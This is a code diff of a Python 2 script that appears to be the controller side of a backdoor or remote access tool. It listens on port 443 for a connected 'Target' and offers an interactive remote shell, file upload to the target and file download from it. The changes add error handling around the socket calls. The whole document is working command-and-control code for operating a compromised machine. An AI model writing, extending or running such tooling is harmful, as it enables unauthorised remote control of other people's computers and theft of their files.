@@ -9,12 +9,25 @@ port = 443
 
 def connect():
     global s
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    except socket.error, msg:
+        print "Couln't Create Socket."
+        exit()
+
 def bind():
-    s.bind((host, port))
+    try:
+        s.bind((host, port))
+    except:
+        print "Cannot bind Socket & Port."
+        exit()
 
 def accept():
-    s.listen(1)
+    try:
+        s.listen(1)
+    except socket.error:
+        print "wtf, can't listen?! What did you DO!?"
+        exit()
     global conn, addr
     conn, addr = s.accept()
 
@@ -46,7 +59,7 @@ Options:
 
   1               Interactive Shell
                   Type "quit" to return to menu from Interactive Shell
-  2               Upload File to Current Working Directory
+  2               Upload File to CWD
   3               Download File
   4               Target IP & Port
   quit            Quit
@@ -82,7 +95,9 @@ Options:
             print "[+] Disconnecting Target"
             conn.send("disconnect")
             conn.close()
-
+        else:
+            print "[-] wtf.. you broke it."
+            exit()
 
 # Interactive Shell
 def command():
@@ -93,7 +108,10 @@ def command():
         split = cmd.split(" ")
         cd = split[0]
         path = split[-1]
-        conn.send(cmd)
+        try:
+            conn.send(cmd)
+        except:
+            print "[-] Cannot send user input."
         if cmd == "quit":
             menu()
         elif cd == "cd":
@@ -107,10 +125,16 @@ def command():
 # Upload File
 def snd_file():
     input_f = raw_input("File path: ")
-    conn.send(input_f)
+    try:
+        conn.send(input_f)
+    except socket.error:
+        print "[-] Cannot send file path."
     snd_f = open(input_f, "rb")
     read = snd_f.read()
-    conn.send(read)
+    try:
+        conn.send(read)
+    except socket.error:
+        print "[-] Cannot send data."
     snd_f.close()
     print "[+] File Sent"
 
@@ -120,8 +144,14 @@ def rcv_file():
     loc_f = raw_input("Remote file path: ")
     split = loc_f.split("/")
     filename = split[-1]
-    conn.send(loc_f)
-    data_f = conn.recv(10000)
+    try:
+        conn.send(loc_f)
+    except:
+        print "[-] Cannot receive file location."
+    try:
+        data_f = conn.recv(10000)
+    except:
+        print "[-] Cannot receive data."
     rcv_f = open(filename, "wb+")
     rcv_f.write(data_f)
     rcv_f.close()
